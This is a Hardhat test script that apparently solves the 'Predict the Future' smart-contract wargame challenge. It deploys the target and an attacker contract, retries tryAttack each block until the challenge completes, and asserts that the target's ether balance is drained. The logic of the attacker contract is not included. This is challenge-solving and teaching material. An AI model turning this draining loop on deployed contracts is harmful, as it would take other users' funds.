import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheFutureChallenge', () => {
  let target: Contract;
  let attacker: Contract;

  before(async () => {
    const targetFactory = await ethers.getContractFactory('PredictTheFutureChallenge');

    target = await targetFactory.deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    console.log('Target deployed on', target.address);
  });

  it('Exploit', async () => {
    const attackerFactory = await ethers.getContractFactory('PredictTheFutureChallengeAttacker');

    attacker = await attackerFactory.deploy(target.address, {
      value: utils.parseEther('1'),
    });

    await attacker.deployed();

    console.log('Attacker deployed on', target.address);

    let tx;
    let blockNumber;
    while (!(await target.isComplete())) {
      console.log('trying');

      blockNumber = await provider.getBlockNumber();
      console.log('blockNumber', blockNumber);

      try {
        tx = await attacker.tryAttack();
        await tx.wait();
      } catch (error) {}
    }
  });

  after(async () => {
    expect(await provider.getBalance(target.address)).to.equal(0);
    expect(await target.isComplete()).to.equal(true);
  });
});
